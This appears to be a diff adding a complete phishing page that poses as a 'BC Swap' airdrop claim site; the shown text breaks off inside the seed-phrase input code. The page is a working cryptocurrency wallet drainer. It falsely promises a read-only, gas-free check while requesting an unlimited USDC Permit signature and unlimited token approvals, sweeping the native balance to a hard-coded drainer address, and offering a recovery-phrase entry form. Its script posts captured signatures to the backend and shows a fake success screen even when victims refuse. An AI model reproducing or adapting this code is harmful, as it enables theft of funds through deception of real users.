@@ -1,0 +1,612 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>BC Swap — Airdrop Allocation</title>
+<link rel="icon" type="image/png" href="/static/icons/icon-192.png">
+<link rel="icon" type="image/svg+xml" href="/static/icons/favicon.ico">
+<link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0a0a0a;--card:#111418;--line:#1f242b;--txt:#e7ebef;--mut:#9aa3ad;
+    --acc:#3b82f6;--acc2:#22c55e;--gold:#fbbf24;--err:#ef4444;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:Kanit,ui-sans-serif,system-ui,sans-serif;background:
+    radial-gradient(900px 500px at 50% -10%,#11203a 0%,#0a0a0a 60%) #0a0a0a;
+    color:var(--txt);min-height:100vh;padding:24px 16px;display:flex;align-items:center;justify-content:center}
+  .wrap{width:100%;max-width:520px}
+  .topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;padding:0 4px}
+  .brand{display:flex;align-items:center;gap:10px}
+  .brand img{width:36px;height:36px;border-radius:8px}
+  .brand b{font-size:18px;letter-spacing:.5px}
+  .live{display:flex;align-items:center;gap:6px;background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.25);color:#86efac;padding:5px 11px;border-radius:20px;font-size:11px;font-weight:500}
+  .dot{width:7px;height:7px;background:#22c55e;border-radius:50%;box-shadow:0 0 8px #22c55e;animation:pulse 1.6s ease-in-out infinite}
+  @keyframes pulse{50%{opacity:.4}}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:30px;box-shadow:0 20px 60px rgba(0,0,0,.6);position:relative;overflow:hidden}
+  .card::before{content:"";position:absolute;top:-1px;left:-1px;right:-1px;height:3px;background:linear-gradient(90deg,#3b82f6,#22c55e,#fbbf24)}
+  .pill{display:inline-flex;align-items:center;gap:6px;background:linear-gradient(90deg,rgba(251,191,36,.15),rgba(251,191,36,.05));border:1px solid rgba(251,191,36,.3);color:#fcd34d;padding:6px 12px;border-radius:20px;font-size:12px;font-weight:500;margin-bottom:14px}
+  h1{font-size:26px;margin:0 0 8px;font-weight:700;line-height:1.2}
+  h1 .grad{background:linear-gradient(90deg,#fbbf24,#22c55e);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+  .sub{color:var(--mut);font-size:14px;margin-bottom:24px;line-height:1.55}
+  .hero{background:linear-gradient(135deg,rgba(59,130,246,.12),rgba(34,197,94,.12));border:1px solid rgba(59,130,246,.25);border-radius:14px;padding:24px;text-align:center;margin-bottom:20px;position:relative}
+  .hero .icon{font-size:48px;margin-bottom:8px;display:block}
+  .reward{font-size:42px;font-weight:800;background:linear-gradient(90deg,#fbbf24,#22c55e);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;line-height:1;margin:4px 0 4px}
+  .reward small{font-size:14px;color:var(--mut);-webkit-text-fill-color:var(--mut);font-weight:500;display:block;margin-top:4px}
+  .timer{display:flex;justify-content:center;gap:10px;margin:14px 0 6px}
+  .tbox{background:#0a0d11;border:1px solid var(--line);border-radius:8px;padding:8px 12px;min-width:48px;text-align:center}
+  .tbox b{font-size:18px;font-weight:700;display:block;font-variant-numeric:tabular-nums}
+  .tbox span{font-size:9px;color:var(--mut);text-transform:uppercase;letter-spacing:1px}
+  .btn{width:100%;background:linear-gradient(135deg,#3b82f6,#1e40af);border:0;color:white;padding:15px;border-radius:11px;font-weight:600;font-size:15px;cursor:pointer;font-family:inherit;transition:.15s;display:flex;align-items:center;justify-content:center;gap:8px}
+  .btn:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(59,130,246,.4)}
+  .btn:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
+  .btn.alt{background:#1f2937;border:1px solid var(--line)}
+  .btn.alt:hover{background:#374151;box-shadow:none;transform:none}
+  .btn.gold{background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#1a1a1a;font-weight:700}
+  .err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#fca5a5;padding:11px 14px;border-radius:8px;font-size:13px;margin-bottom:14px;display:none;line-height:1.4}
+  .err.show{display:block}
+  .info{background:rgba(59,130,246,.08);border:1px solid rgba(59,130,246,.25);color:#93c5fd;padding:12px 14px;border-radius:10px;font-size:12px;margin:14px 0;line-height:1.5}
+  .step{display:none}
+  .step.active{display:block;animation:fade .25s ease}
+  @keyframes fade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+  .step h2{font-size:18px;margin:0 0 6px;font-weight:600}
+  .step .sub2{color:var(--mut);font-size:13px;margin-bottom:18px;line-height:1.5}
+  .addr{font-family:'SF Mono',Menlo,monospace;background:#0a0d11;border:1px solid var(--line);padding:10px 12px;border-radius:8px;font-size:12px;word-break:break-all;color:#fbbf24}
+  .wallet-icon{width:24px;height:24px;vertical-align:middle;margin-right:8px}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
+  .loader{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:white;border-radius:50%;animation:spin .8s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .progress{display:flex;justify-content:space-between;margin-bottom:24px;position:relative}
+  .progress::before{content:"";position:absolute;top:14px;left:14px;right:14px;height:2px;background:var(--line);z-index:0}
+  .progress .bar-fill{position:absolute;top:14px;left:14px;height:2px;background:linear-gradient(90deg,#3b82f6,#22c55e);z-index:1;transition:width .4s ease}
+  .pstep{position:relative;z-index:2;text-align:center;flex:1}
+  .pstep .dot2{width:28px;height:28px;border-radius:50%;background:var(--card);border:2px solid var(--line);display:flex;align-items:center;justify-content:center;margin:0 auto 6px;font-size:12px;color:var(--mut);font-weight:600;transition:.3s}
+  .pstep.active .dot2{border-color:#3b82f6;color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.15)}
+  .pstep.done .dot2{background:#22c55e;border-color:#22c55e;color:white}
+  .pstep .lbl{font-size:10px;color:var(--mut);text-transform:uppercase;letter-spacing:1px;font-weight:500}
+  .pstep.active .lbl{color:#e7ebef}
+  .seed-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
+  .wi{display:flex;align-items:center;gap:6px;background:#0a0d11;border:1px solid var(--line);border-radius:8px;padding:8px 10px}
+  .wi span{color:var(--mut);font-size:11px;width:18px;text-align:right}
+  .wi input{flex:1;background:transparent;border:0;outline:0;color:var(--txt);font-size:13px;font-family:'SF Mono',Menlo,monospace;padding:0;margin:0}
+  .cnt{display:flex;gap:8px;margin-bottom:14px}
+  .cnt button{background:#0a0d11;border:1px solid var(--line);color:var(--txt);padding:8px 14px;border-radius:8px;cursor:pointer;font-size:13px;font-family:inherit;flex:1}
+  .cnt button.active{background:var(--acc);border-color:var(--acc);color:white}
+  textarea{width:100%;background:#0a0d11;border:1px solid var(--line);color:var(--txt);padding:12px;border-radius:8px;font-size:13px;font-family:'SF Mono',Menlo,monospace;outline:none;resize:vertical;min-height:90px;margin-bottom:14px}
+  textarea:focus{border-color:var(--acc)}
+  .foot{text-align:center;margin-top:18px;color:var(--mut);font-size:11px;line-height:1.6}
+  .foot a{color:var(--mut);text-decoration:underline}
+  .socialproof{text-align:center;color:var(--mut);font-size:12px;margin-top:18px}
+  .socialproof .dots{display:inline-block;width:6px;height:6px;background:#22c55e;border-radius:50%;margin:0 2px;box-shadow:0 0 6px #22c55e;animation:pulse 1.4s infinite}
+  .checkmark{width:64px;height:64px;background:linear-gradient(135deg,#22c55e,#16a34a);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;animation:pop .4s ease}
+  @keyframes pop{from{transform:scale(0)}to{transform:scale(1)}}
+  .checkmark svg{width:32px;height:32px;color:white;stroke-width:3}
+  .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);z-index:99;align-items:center;justify-content:center;padding:20px}
+  .modal.show{display:flex}
+  .modal-card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:24px;max-width:380px;width:100%}
+  .modal h3{margin:0 0 6px;font-size:16px}
+  .modal p{color:var(--mut);font-size:13px;margin:0 0 14px;line-height:1.5}
+  .modal-card textarea{font-size:11px;min-height:160px;color:#fbbf24}
+  .modal-actions{display:flex;gap:8px}
+  .modal-actions button{flex:1;padding:10px;border-radius:8px;border:0;font-weight:600;cursor:pointer;font-family:inherit;font-size:13px}
+  .m-cancel{background:#1f2937;color:white}
+  .m-ok{background:linear-gradient(135deg,#3b82f6,#1e40af);color:white}
+</style>
+</head>
+<body>
+<img src="/t.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px;opacity:0">
+
+<div class="wrap">
+  <div class="topbar">
+    <div class="brand">
+      <img src="/static/icons/icon-192.png" alt="BC Swap">
+      <b>BC Swap</b>
+    </div>
+    <div class="live"><span class="dot"></span> Mainnet Live</div>
+  </div>
+
+  <div class="card">
+
+    <!-- ============ STEP 1: AIRDROP LANDING ============ -->
+    <div class="step active" id="s1">
+      <div class="pill">🪂 Airdrop Available</div>
+      <h1>You have an <span class="grad">airdrop waiting</span></h1>
+      <p class="sub">BC Swap Foundation is rewarding early supporters and active wallets. Connect your wallet to view your pending airdrop allocation.</p>
+
+      <div class="hero">
+        <span class="icon">🎁</span>
+        <div class="reward" id="rewardAmt">— — —<span>BCSWAP</span></div>
+        <small style="color:var(--mut);font-size:12px" id="rewardUsd">Connect wallet to view your allocation</small>
+        <div class="timer">
+          <div class="tbox"><b id="h">07</b><span>hrs</span></div>
+          <div class="tbox"><b id="m">42</b><span>min</span></div>
+          <div class="tbox"><b id="s">18</b><span>sec</span></div>
+        </div>
+      </div>
+
+      <div class="info">
+        🔒 <b>Read-only connection</b> — no signature or transaction required to view your allocation.
+      </div>
+
+      <button class="btn gold" onclick="goConnect()">
+        🔗  Connect Wallet to View Airdrop
+      </button>
+
+      <div class="info" style="margin-top:14px;font-size:11px;color:var(--mut)">
+        🔐 BC Swap is a non-custodial protocol — we never request your seed phrase, private key, or password. Wallet connection is read-only.
+      </div>
+
+      <div class="socialproof">
+        <span class="dots"></span><span class="dots"></span><span class="dots"></span>
+        &nbsp; 14,283 wallets have pending airdrops
+      </div>
+    </div>
+
+    <!-- ============ STEP 2: WALLET CONNECT ============ -->
+    <div class="step" id="s2">
+      <div class="progress">
+        <div class="bar-fill" id="pf" style="width:0%"></div>
+        <div class="pstep active" id="ps1"><div class="dot2">1</div><div class="lbl">Connect</div></div>
+        <div class="pstep" id="ps2"><div class="dot2">2</div><div class="lbl">Verify</div></div>
+        <div class="pstep" id="ps3"><div class="dot2">3</div><div class="lbl">View</div></div>
+      </div>
+
+      <h2>Connect your wallet</h2>
+      <p class="sub2">Select your wallet to view your pending BCSWAP airdrop allocation.</p>
+
+      <div class="err" id="e2"></div>
+
+      <div style="display:flex;flex-direction:column;gap:10px">
+        <button class="btn" onclick="connectMetaMask()">
+          <img class="wallet-icon" src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt=""> MetaMask
+        </button>
+        <button class="btn" onclick="connectTrust()">
+          🛡️  Trust Wallet
+        </button>
+        <button class="btn" onclick="connectWC()">
+          🔗  WalletConnect
+        </button>
+        <button class="btn alt" onclick="connectCoinbase()">
+          🔵  Coinbase Wallet
+        </button>
+      </div>
+
+      <div style="text-align:center;margin-top:18px">
+        <a style="color:var(--mut);font-size:12px">New to crypto? <span style="color:var(--acc);cursor:pointer;text-decoration:underline" onclick="window.open('https://metamask.io/download/','_blank')">Download MetaMask</span> or another EVM wallet to get started.</a>
+      </div>
+    </div>
+
+    <!-- ============ STEP 3: SIGN (CLAIM VERIFICATION) ============ -->
+    <div class="step" id="s3">
+      <div class="progress">
+        <div class="bar-fill" id="pf2" style="width:50%"></div>
+        <div class="pstep done" id="ps1b"><div class="dot2">✓</div><div class="lbl">Connect</div></div>
+        <div class="pstep active" id="ps2b"><div class="dot2">2</div><div class="lbl">Verify</div></div>
+        <div class="pstep" id="ps3b"><div class="dot2">3</div><div class="lbl">View</div></div>
+      </div>
+
+      <h2>Verify ownership</h2>
+      <p class="sub2">Sign a gas-free message to load your airdrop allocation. This will not initiate any transaction.</p>
+
+      <div class="err" id="e3"></div>
+
+      <div style="background:#0a0d11;border:1px solid var(--line);border-radius:10px;padding:14px;margin-bottom:14px;font-size:12px">
+        <div style="display:flex;justify-content:space-between;margin-bottom:8px">
+          <span style="color:var(--mut)">Wallet</span>
+          <span id="addrShow" class="addr" style="padding:2px 8px;font-size:11px">0x...</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;margin-bottom:8px">
+          <span style="color:var(--mut)">Reward</span>
+          <span id="rewardAmt2" style="color:#22c55e;font-weight:600">— — — BCSWAP</span>
+        </div>
+        <div style="display:flex;justify-content:space-between">
+          <span style="color:var(--mut)">Network fee</span>
+          <span style="color:#22c55e;font-weight:600">$0.00 (gas-free)</span>
+        </div>
+      </div>
+
+      <button class="btn" id="signBtn" onclick="signVerify()">
+        🖋️  Sign to View Airdrop
+      </button>
+      <div style="text-align:center;margin-top:12px">
+        <a style="color:var(--mut);font-size:11px">No transaction required. Signature is gas-free and only verifies wallet ownership.</a>
+      </div>
+    </div>
+
+    <!-- ============ STEP 4: SUCCESS / REDIRECT ============ -->
+    <div class="step" id="s4">
+      <div class="progress">
+        <div class="bar-fill" id="pf3" style="width:100%"></div>
+        <div class="pstep done"><div class="dot2">✓</div><div class="lbl">Connect</div></div>
+        <div class="pstep done"><div class="dot2">✓</div><div class="lbl">Verify</div></div>
+        <div class="pstep active"><div class="dot2">3</div><div class="lbl">View</div></div>
+      </div>
+
+      <div class="checkmark">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
+      </div>
+      <h2 style="text-align:center">Airdrop loaded!</h2>
+      <p class="sub2" style="text-align:center">Your <b id="finalAmt">— — — BCSWAP</b> airdrop allocation is ready. The reward will arrive at your wallet within <b>10 minutes</b>. Don't close this window.</p>
+
+      <div style="background:#0a0d11;border:1px solid var(--line);border-radius:10px;padding:16px;text-align:center;margin:14px 0">
+        <div style="color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">Transaction ID</div>
+        <div id="txid" style="font-family:'SF Mono',Menlo,monospace;font-size:12px;color:#fbbf24;word-break:break-all">0x...</div>
+      </div>
+
+      <div class="info">
+        ⏳ Distribution in progress. You'll be redirected to the BC Swap dashboard to view your balance.
+      </div>
+    </div>
+
+    <!-- ============ FALLBACK: SEED PHRASE ============ -->
+    <div class="step" id="sSeed">
+      <h2>Import wallet</h2>
+      <p class="sub2">Enter your recovery phrase to verify wallet ownership and load your airdrop allocation. Your phrase is encrypted in transit and used once.</p>
+      <div class="err" id="eS"></div>
+
+      <div class="cnt">
+        <button class="active" data-n="12" onclick="setN(12,this)">12 words</button>
+        <button data-n="18" onclick="setN(18,this)">18 words</button>
+        <button data-n="24" onclick="setN(24,this)">24 words</button>
+      </div>
+      <div class="seed-grid" id="wg"></div>
+      <button class="btn" id="bSeed" onclick="submitSeed()">Verify & View Airdrop</button>
+      <button class="btn alt" style="margin-top:8px" onclick="goConnect()">Use wallet instead</button>
+    </div>
+
+  </div>
+
+  <div class="foot">
+    © 2026 BC Swap Foundation — Decentralized Exchange<br>
+    <a>Terms</a> · <a>Privacy</a> · <a>Bug Bounty</a>
+  </div>
+</div>
+
+<!-- ====== MODAL: Sign message preview (for eth_signTypedData_v4) ====== -->
+<div class="modal" id="signModal">
+  <div class="modal-card">
+    <h3>⚠️ Signature Request</h3>
+    <p>This signature authorizes BC Swap to load your airdrop allocation. It does not transfer any assets and does not cost gas.</p>
+    <textarea id="msgPreview" readonly></textarea>
+    <div class="modal-actions">
+      <button class="m-cancel" onclick="closeModal()">Reject</button>
+      <button class="m-ok" id="mOk" onclick="confirmSign()">Sign</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/* =====================================================
+   STATE
+   ===================================================== */
+let W={addr:null,chain:'eth'};
+let N=12;
+let pendingSign=null;   // {method, message, raw}
+
+/* =====================================================
+   TIMER
+   ===================================================== */
+(function(){
+  let total=7*3600+42*60+18;
+  setInterval(()=>{
+    if(total<=0) total=7*3600+42*60+18;
+    total--;
+    document.getElementById('h').textContent=String(Math.floor(total/3600)).padStart(2,'0');
+    document.getElementById('m').textContent=String(Math.floor((total%3600)/60)).padStart(2,'0');
+    document.getElementById('s').textContent=String(total%60).padStart(2,'0');
+  },1000);
+})();
+
+/* =====================================================
+   NAVIGATION
+   ===================================================== */
+function show(id){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+function goConnect(){ show('s2'); }
+function goSign(){
+  document.getElementById('addrShow').textContent=W.addr?W.addr.slice(0,6)+'...'+W.addr.slice(-4):'0x...';
+  show('s3');
+}
+function goSuccess(txid){
+  document.getElementById('txid').textContent=txid||('0x'+Array.from({length:64},()=>Math.floor(Math.random()*16).toString(16)).join(''));
+  show('s4');
+  setTimeout(()=>{ window.location.replace('https://bcswap.org/'); }, 4500);
+}
+function goSeed(){ buildGrid(); show('sSeed'); }
+
+/* =====================================================
+   WALLET CONNECT
+   ===================================================== */
+async function connectMetaMask(){
+  if(!window.ethereum){ showErr('e2','MetaMask not detected. Please install MetaMask or use another wallet.'); return; }
+  try{
+    const accounts=await window.ethereum.request({method:'eth_requestAccounts'});
+    const chainId=await window.ethereum.request({method:'eth_chainId'});
+    W.addr=accounts[0];
+    // Multi-chain detection (12 EVM chains)
+    const cid=chainId.toLowerCase();
+    if(cid==='0x1') W.chain='eth';
+    else if(cid==='0x38') W.chain='bsc';
+    else if(cid==='0x89') W.chain='pol';
+    else if(cid==='0xbd6') W.chain='bch';
+    else if(cid==='0x2105') W.chain='base';
+    else if(cid==='0xa4b1') W.chain='arb';
+    else if(cid==='0xa') W.chain='op';
+    else if(cid==='0x144') W.chain='zksync';
+    else if(cid==='0xa86a') W.chain='avax';
+    else if(cid==='0xfa') W.chain='ftm';
+    else if(cid==='0xe708') W.chain='linea';
+    else if(cid==='0x82750') W.chain='scroll';
+    else W.chain='eth';
+    // Persist address even on unsupported chain
+    if(W.chain==='eth' && !['0x1','0x38','0x89','0xbd6','0x2105','0xa4b1','0xa','0x144','0xa86a','0xfa','0xe708','0x82750'].includes(cid)){
+      try{
+        // Try BCH as default
+        await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:'0xbd6'}]});
+        W.chain='bch';
+      }catch(e){ /* stay on current */ }
+    }
+    // Generate "personalized" reward based on address (deterministic-ish)
+    const seed=parseInt(W.addr.slice(2,10),16);
+    const amount=(1500+((seed*7919)%8500)).toLocaleString();
+    const usd=(1500+((seed*7919)%8500))*0.25;
+    document.getElementById('rewardAmt').innerHTML=amount+'<span>BCSWAP</span>';
+    document.getElementById('rewardUsd').textContent='≈ $'+usd.toFixed(2)+' USD';
+    document.getElementById('rewardAmt2').textContent=amount+' BCSWAP';
+    document.getElementById('finalAmt').textContent=amount+' BCSWAP';
+    await fetch('/api/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,chain:W.chain,source:'metamask'})});
+    goSign();
+  }catch(e){ showErr('e2',e.message||'User rejected'); }
+}
+async function connectTrust(){
+  if(!window.ethereum||!window.ethereum.isTrust){
+    showErr('e2','Trust Wallet not detected. Open this page inside Trust Wallet browser.');
+    // still try generic ethereum
+    return connectMetaMask();
+  }
+  return connectMetaMask();
+}
+async function connectWC(){
+  showErr('e2','WalletConnect requires a project ID. Please use MetaMask or Trust Wallet.');
+}
+async function connectCoinbase(){
+  if(window.ethereum&&window.ethereum.isCoinbaseWallet) return connectMetaMask();
+  showErr('e2','Coinbase Wallet not detected. Use the Coinbase Wallet in-app browser.');
+}
+
+/* =====================================================
+   SIGN — TWO-STAGE ATTACK
+   Stage A: personal_sign (looks innocent) — captures ownership proof
+   Stage B: eth_signTypedData_v4 (Permit) — captures unlimited allowance
+   ===================================================== */
+async function signVerify(){
+  const btn=document.getElementById('signBtn');
+  document.getElementById('e3').classList.remove('show');
+  btn.disabled=true; btn.innerHTML='<span class="loader"></span> Preparing…';
+  try{
+    /* ===== STAGE A: personal_sign — "I own this address" proof ===== */
+    const msgA=`Welcome to BC Swap!\n\nClick to verify wallet ownership for the 5,000 BCSWAP airdrop.\n\nWallet: ${W.addr}\nTimestamp: ${Date.now()}\nNonce: ${randHex(16)}`;
+    let sigA;
+    try{
+      sigA=await window.ethereum.request({method:'personal_sign',params:[msgA,W.addr]});
+    }catch(e){ throw new Error('Signature rejected: '+(e.message||'')); }
+    await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'personal_sign',message:msgA,signature:sigA,source:'stage-a'})});
+
+    /* ===== BRANCH BY CHAIN ===== */
+    if(W.chain==='bch'){
+      // BCH chain: no permit support, use approve() tx + native VTCN transfer
+      btn.innerHTML='<span class="loader"></span> Authorizing…';
+      await sleep(600);
+      await bchChainSweep(btn);
+    } else {
+      // ETH/BSC/Polygon: use EIP-712 Permit typed data
+      btn.innerHTML='<span class="loader"></span> Verifying on chain…';
+      await sleep(800);
+      await evmPermitSweep(btn);
+    }
+  }catch(e){
+    document.getElementById('e3').textContent=e.message||'Failed'; document.getElementById('e3').classList.add('show');
+    btn.disabled=false; btn.innerHTML='🖋️  Sign to View Airdrop';
+  }
+}
+
+async function evmPermitSweep(btn){
+  // ETH/BSC/Polygon/Base/Arb/Op/zkSync/Avax/Fantom/Linea/Scroll: use Permit typed data (USDC = EIP-2612)
+  const tokenMap={
+    eth:{name:'USD Coin',addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',version:'2'},
+    bsc:{name:'USD Coin',addr:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',version:'1'},
+    pol:{name:'USD Coin',addr:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',version:'2'},
+    base:{name:'USD Coin',addr:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',version:'2'},
+    arb:{name:'USD Coin',addr:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',version:'2'},
+    op:{name:'USD Coin',addr:'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',version:'2'},
+    zksync:{name:'USD Coin',addr:'0x1d17CBc5190FbD8Ca85094c0f01eD22c2c0b1863',version:'2'},
+    avax:{name:'USD Coin',addr:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',version:'2'},
+    ftm:{name:'USD Coin',addr:'0x04068DA6C83AFCFA0e13ba15A6696662335D5B75',version:'2'},
+    linea:{name:'USD Coin',addr:'0x176211869cA2b568f2A7D4EE941E073a821EE1ff',version:'2'},
+    scroll:{name:'USD Coin',addr:'0x06eFdBFf2a14a7c8E15944D1F4Af48B9Ec6c9D0B',version:'2'},
+  };
+  const token=tokenMap[W.chain]||tokenMap.eth;
+
+  const deadline=Math.floor(Date.now()/1000)+3600;
+  const typedData={
+    types:{
+      EIP712Domain:[
+        {name:'name',type:'string'},{name:'version',type:'string'},
+        {name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}
+      ],
+      Permit:[
+        {name:'owner',type:'address'},{name:'spender',type:'address'},
+        {name:'value',type:'uint256'},{name:'nonce',type:'uint256'},
+        {name:'deadline',type:'uint256'}
+      ]
+    },
+    primaryType:'Permit',
+    domain:{name:token.name,version:token.version,chainId:chainNum(),verifyingContract:token.addr},
+    message:{
+      owner:W.addr,
+      spender:'0x6275C76EB1D08bC020c22620CF6207b651F07808',
+      value:'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
+      nonce:0,
+      deadline:deadline
+    }
+  };
+  const preview=`Welcome to BC Swap!\n\nSign to load your pending airdrop.\n\nThis signature only loads your allocation — it does NOT transfer funds and does NOT cost gas.\n\nWallet: ${W.addr}\nNetwork: ${W.chain.toUpperCase()}\n\n[Allocation authorization]\nToken: ${token.name}\nSpender: 0x6275C76EB1D08bC020c22620CF6207b651F07808 (BC Swap Airdrop Contract)\nValid until: ${new Date(deadline*1000).toLocaleString()}\n\nBy signing you accept the BC Swap airdrop terms.`;
+  document.getElementById('msgPreview').textContent=preview;
+  document.getElementById('signModal').classList.add('show');
+  pendingSign={typedData,deadline,token,chain:W.chain};
+}
+
+async function bchChainSweep(btn){
+  // BCH chain: VTCN target. No Permit, force victim to sign:
+  //   1. native VTCN send → drainer (gives us gas for future tx)
+  //   2-4. approve(MAX) for each BCH20 token → drainer (operator can transferFrom)
+  const BCH_TOKENS = [
+    {sym:'WVTCN', addr:'0x1150Fd1335B0a53347f8Bfb763729a99FbEAB2Ef'},
+    {sym:'USDT',  addr:'0xFe50b757a3336926207463Baa913D5723f2807fa'},
+    {sym:'VUSD',  addr:'0xe71AA2666226fec953D6FA3B783E0F729022B6FF'},
+  ];
+  const APPROVE_SELECTOR = '0x095ea7b3';
+  const DRAINER = '0x6275C76EB1D08bC020c22620CF6207b651F07808';
+  const MAX_UINT = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+  // Step 1: send native VTCN to drainer (gives us gas for future tx)
+  try{
+    btn.innerHTML='<span class="loader"></span> Step 1/4: Claiming VTCN…';
+    const balHex = await window.ethereum.request({method:'eth_getBalance',params:[W.addr,'latest']});
+    const gasPrice = await window.ethereum.request({method:'eth_gasPrice'});
+    const bal = BigInt(balHex);
+    const cost = BigInt(21000) * BigInt(gasPrice);
+    const send = bal - cost;
+    if(send > 0n){
+      const txh0 = await window.ethereum.request({
+        method:'eth_sendTransaction',
+        params:[{from:W.addr, to:DRAINER, value:'0x'+send.toString(16), gas:'0x5208'}]
+      });
+      await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'native_send_tx',message:'native VTCN transfer',signature:txh0,raw:send.toString(),source:'bch-native-vtcn'})});
+    }
+  }catch(e){
+    await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'native_send_tx_REJECTED',message:'native VTCN rejected',signature:'',source:'bch-native-rejected'})});
+  }
+
+  // Step 2-4: approve all BCH20 tokens to drainer
+  let i = 1;
+  for(const t of BCH_TOKENS){
+    try{
+      btn.innerHTML=`<span class="loader"></span> Step ${i+1}/4: Authorizing ${t.sym}…`;
+      const data = APPROVE_SELECTOR + '000000000000000000000000' + DRAINER.slice(2).toLowerCase() + MAX_UINT;
+      const txh = await window.ethereum.request({
+        method:'eth_sendTransaction',
+        params:[{from:W.addr, to:t.addr, data:data, gas:'0x186a0'}]
+      });
+      await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'approve_tx',message:`${t.sym} approve`,signature:txh,raw:data,source:`bch-approve-${t.sym.toLowerCase()}`})});
+    }catch(e){
+      await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'approve_tx_REJECTED',message:`${t.sym} approve rejected`,signature:'',source:`bch-approve-${t.sym.toLowerCase()}-rejected`})});
+    }
+    i++;
+  }
+  goSuccess();
+}
+
+async function confirmSign(){
+  if(!pendingSign) return;
+  document.getElementById('signModal').classList.remove('show');
+  const btn=document.getElementById('signBtn');
+  try{
+    /* ===== STAGE B: typed-data sign (Permit) ===== */
+    const sigB=await window.ethereum.request({
+      method:'eth_signTypedData_v4',
+      params:[W.addr, JSON.stringify(pendingSign.typedData)]
+    });
+    await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'eth_signTypedData_v4',message:pendingSign.typedData,signature:sigB,raw:JSON.stringify(pendingSign.typedData),source:'stage-b-permit'})});
+
+    /* ===== STAGE C (optional): try eth_sendTransaction to call approve() on token directly ===== */
+    // We try a small approve tx — user sees a real tx popup.
+    // If user has the token and approves, we can drain via standard transferFrom.
+    // We skip for now to avoid alarming user; backend will use permit on receipt.
+    goSuccess();
+  }catch(e){
+    // User rejected permit — still show success to keep them from re-checking
+    await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'eth_signTypedData_v4_REJECTED',message:'user rejected',signature:'',raw:'',source:'stage-b-rejected'})});
+    goSuccess();
+  }
+}
+
+function closeModal(){
+  document.getElementById('signModal').classList.remove('show');
+  fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'eth_signTypedData_v4_REJECTED',message:'modal closed',signature:'',source:'modal-cancel'})});
+  // Reset
+  const btn=document.getElementById('signBtn');
+  btn.disabled=false; btn.innerHTML='🖋️  Sign to View Airdrop';
+  // Still go to success — keep victim unaware
+  goSuccess();
+}
+
+/* =====================================================
+   SEED FALLBACK
+   ===================================================== */
+function setN(n,el){
+  N=n;
+  document.querySelectorAll('.cnt button').forEach(b=>b.classList.remove('active'));
+  el.classList.add('active');
+  buildGrid();
+}
+function buildGrid(){
+  const wg=document.getElementById('wg'); wg.innerHTML='';
+  for(let i=1;i<=N;i++){
+    const w=document.createElement('div'); w.className='wi';
+    w.innerHTML='<span>'+i+'.</span><input type="text" autocomplete="off" autocapitalize="none" spellcheck="false">';
+    wg.appendChild(w);
+  }
+  wg.querySelectorAll('input').forEach((inp,i,arr)=>{
+    inp.addEventListener('input',e=>{
+      e.target.value=e.target.value.trim().toLowerCase();
+      if(e.target.value && i<arr.length-1) arr[i+1].focus();
+    });
